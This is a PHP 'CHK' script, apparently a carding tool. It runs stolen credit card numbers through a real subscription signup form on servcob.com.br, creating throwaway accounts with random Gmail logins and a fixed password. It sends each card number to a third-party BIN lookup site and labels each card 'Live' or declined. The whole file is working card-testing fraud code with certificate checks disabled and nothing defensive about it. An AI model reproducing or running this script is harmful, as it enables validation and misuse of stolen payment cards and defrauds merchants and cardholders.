
<?php
## @Excluida1 
## Coder <3 
## Copia Msm Parça 

date_default_timezone_set('America/Sao_Paulo');
set_time_limit(0);
error_reporting(0);

switch ($ano) {
case '2016':
$ano = '16';
break;
case '2017':
$ano = '17';
break;
case '2018':
$ano = '18';
break;
case '2019':
$ano = '19';
break;
case '2020':
$ano = '20';
break;
case '2021':
$ano = '21';
break;
case '2022':
$ano = '22';
break;
case '2023':
$ano = '23';
break;
case '2024':
$ano = '24';
break;} 
function _curl($url,$post="" , $postar="") {

$ckfile = "cookie.txt";
$ch = curl_init();
if($postar) {
curl_setopt($ch, CURLOPT_POST ,1);
curl_setopt ($ch, CURLOPT_POSTFIELDS, $post);}
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLINFO_HEADER_OUT, true);
curl_setopt($ch, CURLOPT_USERAGENT, "Dalvik/1.6.0 (Linux; U; Android 4.2.2; C2004 Build/15.2.A.2.5)");
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_VERBOSE, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
'Connection: Keep-Alive'));
curl_setopt($ch, CURLOPT_COOKIESESSION, $ckfile);
curl_setopt($ch, CURLOPT_COOKIEJAR, $ckfile);
curl_setopt($ch, CURLOPT_COOKIE, $ckfile);
curl_setopt($ch, CURLOPT_COOKIEFILE, $ckfile);    
curl_setopt($ch, CURLOPT_RETURNTRANSFER,1);
$result=curl_exec ($ch);
curl_close ($ch);
return $result;}
$random = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 6)), 0, 6);
//echo $card;
switch(substr($card, 0, 1)){case 5:$b = "MasterCard";break;case 4:$b = "Visa";break;case 3:$b = "Amex";break;default:break;}
$proxylist = ''.mt_rand('17', '22').'.'.mt_rand('100', '255').'.'.mt_rand('100', '255').'.'.mt_rand('100', '255').'';
$envia = _curl('https://www.servcob.com.br/custom/tufos/index.aspx?codSite=68E43CB9-83DA-444E-B09B-F14668BEE35F&nome=&login='.$random.'%40gmail.com&senha=diego2512&idplano=477&tipoPagamento=cartao&utm_source=assinantes.tufos.com.br&utm_medium=assinantes.tufos.com.br&utm_campaign=assinantes.tufos.com.br', false, false);
$post = '__VIEWSTATE=%2FwEPDwUKMTYyNjg3NDA3Nw9kFgICAw9kFgoCAQ8WAh4FVmFsdWUFDjIwMS45NS4xODMuMTI5ZAIDDxYCHgtfIUl0ZW1Db3VudAIDFgZmD2QWBAIBDxAPZBYCHgV2YWx1ZQUDNDc3ZGRkAgIPFQIQMSBNw6pzIGRlIEFjZXNzbwUyOSw5MGQCAQ9kFgQCAQ8QD2QWAh8CBQM0NzhkZGQCAg8VAhEzIE1lc2VzIGRlIEFjZXNzbwU0OSw5MGQCAg9kFgQCAQ8QD2QWAh8CBQM0NzlkZGQCAg8VAhE1IE1lc2VzIGRlIEFjZXNzbwU2OSw5MGQCCQ8PFgIeBE1vZGULKiVTeXN0ZW0uV2ViLlVJLldlYkNvbnRyb2xzLlRleHRCb3hNb2RlAGRkAhcPEGQQFQ0ETcOqcwIwMQIwMgIwMwIwNAIwNQIwNgIwNwIwOAIwOQIxMAIxMQIxMhUNATACMDECMDICMDMCMDQCMDUCMDYCMDcCMDgCMDkCMTACMTECMTIUKwMNZ2dnZ2dnZ2dnZ2dnZ2RkAhkPEGQQFQ0DQW5vBDIwMTcEMjAxOAQyMDE5BDIwMjAEMjAyMQQyMDIyBDIwMjMEMjAyNAQyMDI1BDIwMjYEMjAyNwQyMDI4FQ0BMAIxNwIxOAIxOQIyMAIyMQIyMgIyMwIyNAIyNQIyNgIyNwIyOBQrAw1nZ2dnZ2dnZ2dnZ2dnZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFhEFF3JwdFBsYW5vcyRjdGwwMCRyYlBsYW5vBRdycHRQbGFub3MkY3RsMDEkcmJQbGFubwUXcnB0UGxhbm9zJGN0bDAxJHJiUGxhbm8FF3JwdFBsYW5vcyRjdGwwMiRyYlBsYW5vBRdycHRQbGFub3MkY3RsMDIkcmJQbGFubwUOcmJCYW5kZWlyYVZpc2EFDnJiQmFuZGVpcmFWaXNhBRByYkJhbmRlaXJhTWFzdGVyBRByYkJhbmRlaXJhTWFzdGVyBRByYkJhbmRlaXJhRGluZXJzBRByYkJhbmRlaXJhRGluZXJzBQ5yYkJhbmRlaXJhQW1leAUOcmJCYW5kZWlyYUFtZXgFD3JiQmFuZGVpcmFIaXBlcgUPcmJCYW5kZWlyYUhpcGVyBQZjYk5ld3MFCmJ0bkFzc2luYXLtvZiKGypYUCbmqbsg1iUl9hssSXj%2FkcGVVjPZsbob9g%3D%3D&__VIEWSTATEGENERATOR=08DBBB1F&__EVENTVALIDATION=%2FwEdACsfhe03srx9YkSDofoW3Fv8zYP2%2BDIQBVBXtuPceXeDVqW0ZporlBQj%2Bl%2BdCg2tCA8gTHQtohp1zlP76T%2Fd6jC0f6bjNQsNHx%2F0ebedwSAqbYTLTEXsL7gb0FkE3CbSbFG8uqv5Gz8bNocR%2FygXgDS2R1ig9mmQyoC%2FK64C%2FgAp%2FheXPvE2L6WDcwlPsYo1FNSTnj%2B3LoFTuAh0j0b7AKODNfutlqiSHovns7TGBkExCUdyxrZvdqIXLqfmJigDN3sDhNAd5fyD8YyEoNrGr3ITKlI5WbbdmjUzoFy%2FNVc2py2fcdta21Y9cnAh%2B%2FIrza55HgFZuL35krZsPtfKhT5n4JvpQC8Py2UT8QAy6jnqDTkAf2ND2ed94Bj1miPDodL%2BxhYiPL9h%2FMxDJDAVf3m6qLLh81cSxKHodIPnfMZgA2kxAD1akY3VaqnI5XJyEfEs46Bck2Krzjp0W4SC8yGJUxyt8wlm2PyJuYCdSU0TI8UyIDZ8mfDUaiQpN4EQU5NFC6DvE2ZWDBkFRZvtswMKaCDek2XPo7tVkQb4o%2BlkWmEczdHTr5VxH9EIaccV7u04L8tzQfMWl33Z2zFDAMkVzmKMt21yYGgunPyujtjY%2FnC6sqgt6ATgIA8uFqhTCdEJ6RCw4IBxFsz1e7UEysOjZx%2Bhy2eVR1prblwVHjajHpnyAqeY4fPgQJYF2rIl6OiDd7Xu%2FWNDhDyUolkkVWJIQv0a%2B%2FP1W5w8mtbfbLBBipPlJMYHj4HNGbLqYxbH7hiWHfJ8DhLBxaWuI0%2BWmRzf1OjMtFhh5dTJceUuF%2BULpNXkvOzRSggxGgqKiDPh0PchboFrCWYqykRE6NEiEMFSRHpqhjLC60ItgQPooWYoUviTtmZiw6q2ltYFoCtkACCDac8Sk9vzR4f%2BQA%2FQJNpcCB6OVm80QpK4Do6jTGnmQz7wfrQ%2Fz8kPeuoa%2BwcE%2FPQ%3D&rptPlanos%24ctl00%24planos=477&txtfield_nome=Diego+Silva&txtfield_email='.$random.'%40gmail.com&txtfield_senha=diego2512&bandeiras=2&txtfield_nomecartao=Diego+Silva&ddlValidadeMes='.$mes.'&ddlValidadeAno='.$ano.'&txtfield_nrcartao='.$card.'&txtfield_codseg='.$cvv.'&btnAssinar.x=186&btnAssinar.y=52
';
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.servcob.com.br/custom/tufos/index.aspx?codSite=68E43CB9-83DA-444E-B09B-F14668BEE35F&nome=&login='.$random.'%40gmail.com&senha=diego2512&idplano=477&tipoPagamento=cartao&utm_source=assinantes.tufos.com.br&utm_medium=assinantes.tufos.com.br&utm_campaign=assinantes.tufos.com.br');
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 0);
curl_setopt($ch, CURLOPT_LOW_SPEED_LIMIT, 0);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, array());
curl_setopt($ch, CURLOPT_COOKIESESSION, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookies.txt');
curl_setopt($ch, CURLOPT_VERBOSE, 1);
curl_setopt($ch, CURLOPT_POST, 0);       
curl_setopt($ch, CURLOPT_REFERER, 'https://www.servcob.com.br/custom/tufos/index.aspx?codSite=68E43CB9-83DA-444E-B09B-F14668BEE35F&nome=&login='.$random.'%40gmail.com&senha=diego2512&idplano=477&tipoPagamento=cartao&utm_source=assinantes.tufos.com.br&utm_medium=assinantes.tufos.com.br&utm_campaign=assinantes.tufos.com.br');
curl_setopt($ch, CURLOPT_POSTFIELDS, $post);
$bin =  substr($card,0,6);
$curl_ch = curl_init();
curl_setopt($curl_ch, CURLOPT_URL, "http://alltoolug.com/webtools/tool/othertool/bin/");
curl_setopt($curl_ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl_ch, CURLOPT_POST, TRUE);
curl_setopt($curl_ch, CURLOPT_FOLLOWLOCATION, TRUE);
curl_setopt($curl_ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0");
curl_setopt($curl_ch, CURLOPT_POSTFIELDS, 'listcc='.$card.'&submit=CHECK+NOW');
$dadosSite = curl_exec($curl_ch);  
$expl = explode('</td>', $dadosSite);  
$Banco = $expl[5];  
$Tipo = $expl[6]; 
$Pais = $expl[7]; 
$quatro = $expl[8];  
$dia = date("d/m");
$usr =  "@Excluida1";
$resultadobin = " Informações : $Tipo - $Banco - $Pais [ $usr - $dia ]";
$result = curl_exec($ch);
#echo $result;
curl_close($ch);
	if(strpos($result, 'DETALHES DE SUA ASSINATURA') !== false)
	{
	echo "<p class='text-success'><strong>Live :</strong> ".$linha." $resultadobin CONTA GERADA : $random@gmail.com | diego2512 <script>notify();</script>  #DiegoCHK</span></p>";
	}
	elseif (strpos($result,'The credit card was declined')!== false)
	{
	echo "<p class='text-danger'><strong>Reprovada :</strong> ".$linha." $resultadobin   #DiegoCHK</span></p>";
	}
	elseif (strpos($result, 'This transaction has been declined')) 
	{
	echo "<p class='text-danger'><strong>Reprovada :</strong> ".$linha." $resultadobin   #DiegoCHK</span></p>";
	}
	elseif (strpos($result, 'The credit card number is invalid')) 
	{
	echo "<p class='text-danger'><strong>Reprovada :</strong> ".$linha." $resultadobin   #DiegoCHK</span></p>";
	}
	else
	{
    echo "<p class='text-danger'><strong>Erro :</strong> ".$linha." $resultadobin   #DiegoCHK</span></p>";
    }

?>